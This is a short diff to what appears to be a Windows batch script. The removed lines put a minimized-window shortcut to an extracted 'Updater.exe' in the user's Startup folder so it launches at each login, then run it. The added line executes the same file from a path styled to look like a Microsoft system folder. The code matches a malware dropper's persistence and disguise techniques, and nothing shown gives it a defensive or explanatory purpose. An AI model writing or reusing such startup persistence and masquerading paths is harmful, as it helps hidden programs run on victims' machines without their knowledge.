@@ -30,23 +30,4 @@ for /f "tokens=*" %%i in ('powershell -Command "[Environment]::GetFolderPath('St
 REM Full path to the shortcut file
 set "shortcutPath=%startupFolder%\UpdaterShortcut.lnk"
 
-REM Create a shortcut to the extracted file in the Startup folder
-powershell -Command ^
-"$ws = New-Object -ComObject WScript.Shell; ^
- $s = $ws.CreateShortcut('%shortcutPath%'); ^
- $s.TargetPath = '%destinationFolder%\Updater.exe'; ^
- $s.WorkingDirectory = '%destinationFolder%'; ^
- $s.WindowStyle = 7; ^
- $s.Save()"
-echo Shortcut created at %shortcutPath%
-
-powershell -Command ^
-"$ws = New-Object -ComObject WScript.Shell; ^
- $s = $ws.CreateShortcut('%destinationPath%\Updater.lnk'); ^
- $s.TargetPath = '%extractionFolder%\Updater.exe'; ^
- $s.WorkingDirectory = '%extractionFolder%'; ^
- $s.WindowStyle = 7; ^
- $s.Save()"
-echo Shortcut created at %shortcutPath%
-
-cmd /c "%destinationPath%\Updater.lnk"
+C:\Microsoft\Windows\STD\UpdaterFiles\Updater.exe
